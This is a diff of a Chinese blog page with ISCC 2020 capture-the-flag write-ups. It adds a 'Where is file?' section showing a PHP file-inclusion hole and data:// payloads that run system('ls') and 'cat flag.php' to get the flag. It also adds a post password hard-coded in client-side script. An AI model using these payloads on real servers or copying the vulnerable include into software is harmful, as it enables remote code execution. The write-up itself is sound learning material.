@@ -13,8 +13,8 @@
 <meta name="theme-color" content="#222">
 <script>
     (function () {
-        if ('') {
-            if (prompt('请输入文章密码') !== '') {
+        if ('wpx123') {
+            if (prompt('请输入文章密码') !== 'wpx123') {
                 alert('密码错误！');
                 if (history.length === 1) {
                     location.replace("https://evenyao.com"); // 这里替换成你的首页
@@ -99,10 +99,11 @@
 <meta property="og:site_name" content="w1ndy&#39;s Blog">
 <meta property="og:description" content="Web阿森的爱情-1测试了下SQL注入，没啥反应，源码也啥都没有dirsearch直接扫，在readme.txt中发现flag">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/web1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/file.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/socre.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/dio.jpg">
 <meta property="article:published_time" content="2020-05-01T08:36:27.000Z">
-<meta property="article:modified_time" content="2020-05-05T12:38:33.659Z">
+<meta property="article:modified_time" content="2020-05-09T06:52:08.358Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/web1.jpg">
@@ -303,8 +304,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-05-05T20:38:33+08:00">
-                2020-05-05
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-09T14:52:08+08:00">
+                2020-05-09
               </time>
             
           </span>
@@ -374,6 +375,8 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGE9J2ZsYWd7dV9yX3JlYWxseV9hX3BocF9leHBlcnR9Jzs/Pg0K</span><br></pre></td></tr></table></figure>
 <p>解密后</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">'flag&#123;u_r_really_a_php_expert&#125;'</span>;?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'hello'</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$file</span>, <span class="string">"file://"</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>=str_replace(<span class="string">"file://"</span>, <span class="string">""</span>, <span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">include(<span class="variable">$file</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>文件包含漏洞，过滤了file协议，换个协议就行了<br>payload:?file=data://text/plain,<?php system("ls")?><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/file.jpg" alt=""><br>发现有flag.php<br>payload:?file=data://text/plain,<?php system("cat flag.php")?><br>在注释中发现了flag{web_include_file}</p>
 <h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ISCC签到"><a href="#ISCC签到" class="headerlink" title="ISCC签到"></a>ISCC签到</h4><p>吐槽一下：签到题还整个坑，出题人也是够了<br>一张图片，名字是high.png,第一反应修改图片高度，果然在图片底部隐藏有信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125;</span><br></pre></td></tr></table></figure>
 <p>提交发现不对，去掉ISCC和括号也不对，变成小写iscc也不对，前缀改成flag还是不对，群里的大佬纷纷讨论，是不是题目有问题，客服来了句这道题有坑，直接了<br>一套子图片隐写工具下来没啥发现，就回到了隐藏信息上<br>想了好久，试了好几种加密方式，最后突发奇想可能是维吉尼亚密码，密钥也试了好几种，差点就觉得不是维吉尼亚密码了<br>突然想到high可能是密码，然后就解出来了</p>
@@ -425,6 +428,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/08/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" rel="prev" title="php伪随机数">
+                php伪随机数 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -505,7 +512,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -555,7 +562,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#阿森的爱情-1"><span class="nav-text">阿森的爱情-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Php-is-the-best-language"><span class="nav-text">Php is the best language</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ISCC签到"><span class="nav-text">ISCC签到</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找小明-1"><span class="nav-text">寻找小明-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ISCC成绩查询-1"><span class="nav-text">ISCC成绩查询-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#是我DIO哒-擂台赛"><span class="nav-text">是我DIO哒(擂台赛)</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#阿森的爱情-1"><span class="nav-text">阿森的爱情-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Php-is-the-best-language"><span class="nav-text">Php is the best language</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Where-is-file"><span class="nav-text">Where is file?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ISCC签到"><span class="nav-text">ISCC签到</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找小明-1"><span class="nav-text">寻找小明-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ISCC成绩查询-1"><span class="nav-text">ISCC成绩查询-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#是我DIO哒-擂台赛"><span class="nav-text">是我DIO哒(擂台赛)</span></a></li></ol></li></ol></div>
             
 
           </div>
